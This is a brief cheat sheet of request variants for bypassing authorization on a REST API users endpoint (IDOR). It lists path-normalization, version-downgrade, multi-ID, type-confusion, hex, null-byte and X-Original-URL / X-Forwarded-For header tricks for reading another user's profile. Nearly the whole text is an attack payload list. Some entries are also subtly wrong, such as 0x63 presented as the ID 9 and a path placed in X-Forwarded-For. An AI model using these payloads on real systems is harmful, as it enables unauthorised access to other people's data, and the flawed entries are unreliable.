# Profile
/api/v5/users/10    => 200 OK
/api/v5/users/9     => 403 / 404

# Try Below for 200 OK
/api/v5/users/9/        # Trailing Slash / Path Normalization
/api/v5/users//9//      # Double-Slash / Obfuscated Path
/api/v1/users/9/        # Version Downgrade
/api/v1/users/9/info    # Subpath / Endpoint Variant

# /api/v1/users/9'      # Multi-ID / Filter Parameter Abuse
/api/v1/users/9,8       # Multi-ID / Filter Parameter Abuse
/api/v1/users/10.8      # Multi-ID / Filter Parameter Abuse
/api/v1/users?id=10,9   # Multi-ID / Filter Parameter Abuse

/api/v1/users/*9*       # Type Confusion
/api/v1/users/9abc      # Type Confusion

/api/v1/users/09        # Leading Zero / Hex / Alternate Format
/api/v1/users/0x63      # Leading Zero / Hex / Alternate Format

/api/v1/users/9%00      # NULL / Termination / Control-Char Encoding
/api/v1/users/9%00//    # NULL / Termination / Control-Char Encoding

/api/v1/users/9     + X-Original-URL: /api/v1/users/10      # Header / Proxy-Based Bypass
/api/v1/users/9     + X-Forwarded-For: /api/v1/users/10     # Header / Proxy-Based Bypass

/api/v1/users/%209      # Encoded-Space Tricks


